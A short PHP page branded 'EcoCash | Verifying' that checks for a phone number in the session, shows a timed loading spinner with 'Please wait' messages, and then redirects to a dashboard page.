<?php
session_start();

if (!isset($_SESSION['phone'])) {
    header("Location: login.php");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>EcoCash | Verifying</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
    margin: 0;
    height: 100vh;
    background: #9ca3af;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: Arial, Helvetica, sans-serif;
}

.box {
    background: #fff;
    width: 90%;
    max-width: 380px;
    padding: 40px 25px;
    border-radius: 18px;
    text-align: center;
}

.spinner {
    width: 70px;
    height: 70px;
    border: 6px solid #e5e7eb;
    border-top: 6px solid #6366f1;
    border-radius: 50%;
    margin: 0 auto 25px;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}

h2 {
    color: #6366f1;
    margin-bottom: 6px;
}

p {
    color: #6b7280;
    font-size: 14px;
}
</style>
</head>

<body>

<div class="box">
    <div class="spinner"></div>

    <h2 id="title">Verifying...</h2>
    <p id="text">Please wait</p>
</div>

<script>
setTimeout(() => {
    document.getElementById("title").innerText = "Please wait...";
    document.getElementById("text").innerText = "This may take some time";
}, 3000);

/* load result page */
setTimeout(() => {
    window.location.href = "dashboard.php";
}, 5500);
</script>

</body>
</html>
